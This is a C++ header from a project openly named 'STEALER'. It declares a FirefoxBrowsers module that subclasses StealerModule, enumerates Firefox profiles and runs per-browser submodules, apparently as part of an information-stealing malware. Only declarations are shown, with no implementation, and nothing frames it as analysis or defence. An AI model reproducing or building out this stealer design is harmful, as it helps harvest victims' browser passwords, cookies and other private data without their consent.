//
// Created by .1qxz on 09.06.2024.
//

#ifndef STEALER_FIREFOXBROWSERS_H
#define STEALER_FIREFOXBROWSERS_H


#include "../../../StealerModule.h"
#include "FirefoxBrowserModule.h"

class FirefoxBrowsers : public StealerModule {
public:
    FirefoxBrowsers();

    void execute(fs::path &root) override;
private:
    std::list<FirefoxBrowserModule*> modules;
    static std::vector<std::string> findProfiles(const fs::path &path);
};


#endif //STEALER_FIREFOXBROWSERS_H
